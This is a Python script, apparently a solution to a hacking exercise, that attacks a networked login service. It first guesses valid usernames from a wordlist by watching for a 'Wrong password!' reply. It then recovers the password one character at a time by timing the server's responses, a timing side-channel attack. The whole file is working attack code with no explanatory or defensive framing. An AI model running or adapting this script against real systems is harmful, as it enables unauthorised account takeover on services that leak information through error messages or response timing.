import sys, socket, string, time, os, json

ip_address, user_port = sys.argv[1:]
logins = open(os.path.join(os.path.dirname(__file__), 'logins.txt'))

with socket.socket() as new_connection:
  new_connection.connect((ip_address, int(user_port)))

  log_n_pass = {"login": "", "password": ""}

  for line in logins:
    new_connection.send(json.dumps({"login": line.strip("\n"), "password": " "}).encode())
    if "Wrong password!" in new_connection.recv(1024).decode():
      log_n_pass["login"] = line.strip("\n")
      break

  while True:
    for i in string.printable:
      start_time = time.time()
      new_connection.send(json.dumps({"login": log_n_pass["login"], 
                                      "password": log_n_pass["password"] + i}).encode())
      responce = new_connection.recv(1024).decode()
      end_time = time.time()
      if end_time - start_time > 0.1:
        log_n_pass["password"] += i
        break  
      elif "Connection success!" in responce:
        log_n_pass["password"] += i
        print(json.dumps(log_n_pass))
        exit()